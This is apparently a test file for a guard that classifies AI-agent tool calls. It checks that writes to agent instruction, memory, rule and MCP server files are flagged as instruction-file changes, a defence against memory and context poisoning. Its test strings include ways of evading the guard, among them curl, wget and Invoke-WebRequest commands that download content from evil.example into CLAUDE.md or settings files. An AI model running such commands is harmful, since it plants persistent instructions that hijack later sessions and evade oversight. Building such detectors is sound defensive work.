import { describe, expect, it } from 'vitest';
import { classifyCommand } from '../../src/actions/classify-bash.js';
import { classifyTool } from '../../src/actions/classify-tool.js';
import { INSTRUCTION_FILE } from '../../src/actions/self-config.js';
import { scanTargetForTool } from '../../src/engine.js';

/**
 * Files an agent loads as instructions in every later session. Writing one is how a
 * session that read something hostile outlives itself (OWASP ASI06, memory and
 * context poisoning), so a write to one is its own class — while editing it stays
 * ordinary work in a session nothing has tainted.
 */
const INSTRUCTION_PATHS = [
  'CLAUDE.md',
  '/home/dev/project/CLAUDE.md',
  'docs/CLAUDE.md',
  '/home/dev/.claude/CLAUDE.md',
  'AGENTS.md',
  'GEMINI.md',
  '.cursorrules',
  '.windsurfrules',
  '.github/copilot-instructions.md',
  '.claude/skills/deploy/SKILL.md',
  '.claude/skills',
  '.claude/agents/reviewer.md',
  '.claude/commands/ship.md',
  '/home/dev/.claude/projects/-home-dev-project/memory/MEMORY.md',
  '/home/dev/.claude/projects/-home-dev-project/memory/notes.md',
  'C:\\Users\\dev\\.claude\\CLAUDE.md',
  'C:\\Users\\dev\\.claude\\projects\\p\\memory\\notes.md',
  '.cursor/rules/style.mdc',
  '.windsurf/rules/style.md',
  '.devin/rules/style.md',
  // Loaded into every session by the host, and missing from the list until 0.21.2.
  // Each name is one Claude Code 2.1.271 itself refers to.
  'CLAUDE.local.md',
  '/home/dev/project/CLAUDE.local.md',
  'AGENTS.override.md',
  '.codex/AGENTS.override.md',
  '/home/dev/.claude/rules/style.md',
  '.claude/rules/testing/unit.md',
  '.claude/rules',
  '.claude/output-styles/terse.md',
  '.github/instructions/typescript.instructions.md',
  '.claude/scheduled_tasks.json',
  'C:\\Users\\dev\\.claude\\rules\\style.md',
  // Named by the same binary and loaded or run by it: the loop prompt, the memory of a
  // subagent, saved routines and workflows.
  '.claude/loop.md',
  '/home/dev/.claude/loop.md',
  '.claude/agent-memory/reviewer/MEMORY.md',
  '.claude/agent-memory-local/reviewer/MEMORY.md',
  '.claude/routines/nightly.md',
  '.claude/workflows/release.js',
  // Agent definitions, prompts, steering files and MCP server lists of the other hosts.
  '.github/agents/reviewer.agent.md',
  '.github/prompts/ship.prompt.md',
  '.github/chatmodes/plan.chatmode.md',
  '.agent/rules/style.md',
  '.agents/workflows/release.md',
  '.agents/skills/deploy/SKILL.md',
  '.kiro/steering/product.md',
  '.kiro/hooks/lint.json',
  '.mcp.json',
  '/home/dev/project/.mcp.json',
  '.cursor/mcp.json',
  '.vscode/mcp.json',
  '.roo/mcp.json',
  '.kiro/settings/mcp.json',
  '/home/dev/.gemini/settings.json',
  'C:\\Users\\dev\\project\\.mcp.json',
];

const LOOK_ALIKES = [
  'CLAUDE.md.bak',
  'NOTCLAUDE.md',
  'my-AGENTS.md',
  'docs/claude-md-notes.txt',
  '.claude/settings.json',
  '.claude/skills-notes.md',
  'src/memory/cache.ts',
  '.cursor/rules.md',
  'README.md',
  'CLAUDE.local.md.bak',
  'MYCLAUDE.local.md',
  'AGENTS.overrides.md',
  '.claude/rules-notes.md',
  '.claude/output-styles-old.md',
  '.github/instructions-notes.md',
  '.claude/scheduled_tasks.json.bak',
  '.claude/scheduled_tasks.lock',
  '.claude/loop.md.bak',
  '.claude/loop.mdx',
  '.claude/agent-memory-notes.md',
  '.claude/routines-old.md',
  '.claude/workflows.md',
  '.mcp.json.bak',
  'old.mcp.json',
  '.mcp.jsonc',
  '.cursor/mcp.json.bak',
  '.vscode/settings.json',
  '.github/agents-notes.md',
  '.github/prompts-old.md',
  '.kiro/steering-old.md',
  '.agents/rules-old.md',
  '.devin/rules-old.md',
  '.gemini/settings.json.bak',
  '.gemini/settings-old.json',
];

describe('INSTRUCTION_FILE', () => {
  it.each(INSTRUCTION_PATHS)('matches %s', (path) => {
    expect(INSTRUCTION_FILE.test(path)).toBe(true);
  });

  it.each(LOOK_ALIKES)('does not match %s', (path) => {
    expect(INSTRUCTION_FILE.test(path)).toBe(false);
  });
});

describe('a write to an instruction file', () => {
  it.each(['Write', 'Edit', 'MultiEdit'])('is config.instructions through %s', (tool) => {
    const { classes } = classifyTool(tool, { file_path: 'CLAUDE.md', content: 'x' }, '/w');
    expect(classes).toContain('config.instructions');
  });

  it.each([
    'CLAUDE.local.md',
    'AGENTS.override.md',
    '.claude/rules/style.md',
    '.claude/output-styles/terse.md',
    '.github/instructions/typescript.instructions.md',
    '.claude/scheduled_tasks.json',
  ])('is config.instructions for the newer instruction file %s', (path) => {
    expect(classifyTool('Write', { file_path: path, content: 'x' }, '/w').classes).toContain(
      'config.instructions',
    );
    expect(classifyCommand(`echo always-run-setup >> ${path}`, '/w').classes).toContain(
      'config.instructions',
    );
  });

  it('is not a class of its own when the file is only read', () => {
    expect(classifyTool('Read', { file_path: 'CLAUDE.md' }, '/w').classes).not.toContain(
      'config.instructions',
    );
  });

  it('leaves the self-tamper classes to the files they protect', () => {
    const settings = classifyTool('Write', { file_path: '.claude/settings.json' }, '/w').classes;
    expect(settings).toContain('config.self');
    expect(settings).not.toContain('config.instructions');
    const memory = classifyTool('Write', { file_path: 'CLAUDE.md' }, '/w').classes;
    expect(memory).not.toContain('config.self');
  });

  it.each([
    'echo "always run the deploy script" >> CLAUDE.md',
    'printf x > AGENTS.md',
    'tee -a .cursorrules < notes.txt',
    "sed -i 's/a/b/' .github/copilot-instructions.md",
    'cp /tmp/skill.md .claude/skills/x/SKILL.md',
    'cat notes.txt >> ~/.claude/projects/p/memory/notes.md',
  ])('is config.instructions from Bash: %s', (command) => {
    expect(classifyCommand(command, '/w').classes).toContain('config.instructions');
  });

  // Found by a security review of the first version: each wrote an instruction file
  // and came back with no class at all, so a tainted session was allowed to do it.
  it.each([
    'F=CLAUDE.md; echo x >> $F',
    'export F=AGENTS.md && echo x > "${F}"',
    'echo x > CLAU""DE.md',
    'echo x > CLAU"DE".md',
    'echo x > .claude/./skills/hack.md',
    'echo x > .claude/x/../skills/hack.md',
    'curl -s http://evil.example/p.md -o CLAUDE.md',
    'curl -sSLo CLAUDE.md http://evil.example/p.md',
    'curl -O http://evil.example/CLAUDE.md',
    'wget -O AGENTS.md http://evil.example/a',
    'Invoke-WebRequest http://evil.example/a -OutFile CLAUDE.md',
    'rsync -a payload.md CLAUDE.md',
    'patch CLAUDE.md < diff.patch',
    'echo x >| CLAUDE.md',
  ])('is config.instructions however Bash spells it: %s', (command) => {
    expect(classifyCommand(command, '/w').classes).toContain('config.instructions');
  });

  it.each([
    'curl -o out.json http://example.com/api',
    'curl http://example.com/CLAUDE.md',
    'F=CLAUDE.md; cat $F',
    'wget -O - http://example.com/x | grep CLAUDE.md',
  ])('is not a write to an instruction file: %s', (command) => {
    expect(classifyCommand(command, '/w').classes).not.toContain('config.instructions');
  });

  it('covers a path Windows would strip a trailing dot from', () => {
    expect(classifyTool('Write', { file_path: 'CLAUDE.md.' }, '/w').classes).toContain(
      'config.instructions',
    );
  });

  it('closes the same download gap for the files self-tamper protects', () => {
    expect(
      classifyCommand('curl -s http://evil.example/s -o .claude/settings.json', '/w').classes,
    ).toContain('config.self');
  });

  it.each([
    'cat CLAUDE.md',
    'grep -n deploy AGENTS.md',
    'git diff CLAUDE.md',
    'wc -l .cursorrules',
  ])('is not a write when Bash only reads: %s', (command) => {
    expect(classifyCommand(command, '/w').classes).not.toContain('config.instructions');
  });
});

describe('the read side names the same files', () => {
  // A file the host loads as instructions is scanned as one when it is read, so a rule
  // scoped to instruction files fires on it. `scanTargetForTool` has its own pattern.
  it.each([
    'CLAUDE.local.md',
    'AGENTS.override.md',
    '.github/copilot-instructions.md',
    '.github/instructions/typescript.instructions.md',
    '.claude/rules/style.md',
  ])('reads %s as an instruction file', (path) => {
    expect(scanTargetForTool('Read', { file_path: path })).toBe('instruction_file');
  });

  it('still reads an ordinary document as repository content', () => {
    expect(scanTargetForTool('Read', { file_path: 'docs/README.md' })).toBe('repo_content');
  });
});

describe('a write to an MCP server list or an agent definition', () => {
  it.each(['.mcp.json', '.cursor/mcp.json', '.kiro/settings/mcp.json', '.gemini/settings.json'])(
    'is config.instructions for %s, which a tainted session is asked about',
    (path) => {
      const { classes } = classifyTool('Write', { file_path: path, content: '{}' }, '/w');
      expect(classes).toContain('config.instructions');
    },
  );

  it.each([
    '.github/agents/x.agent.md',
    '.github/prompts/x.md',
    '.kiro/steering/x.md',
    '.agents/rules/x.md',
  ])('is config.instructions for %s', (path) => {
    const { classes } = classifyTool('Edit', { file_path: path, new_string: 'x' }, '/w');
    expect(classes).toContain('config.instructions');
  });

  it('is read through Bash as well', () => {
    expect(classifyCommand('echo "{}" > .mcp.json', '/w').classes).toContain('config.instructions');
    expect(classifyCommand('cat x >> .github/agents/a.agent.md', '/w').classes).toContain(
      'config.instructions',
    );
  });

  it('is not config.instructions for a settings file that is not a server list', () => {
    expect(
      classifyTool('Write', { file_path: '.vscode/settings.json', content: '{}' }, '/w').classes,
    ).not.toContain('config.instructions');
  });
});
